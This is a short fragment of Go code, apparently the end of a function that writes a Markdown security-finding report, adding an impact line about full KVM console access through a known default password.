	b.WriteString("\n\n**Impact:** Full KVM console access with a known default password.\n")
	return b.String()
}
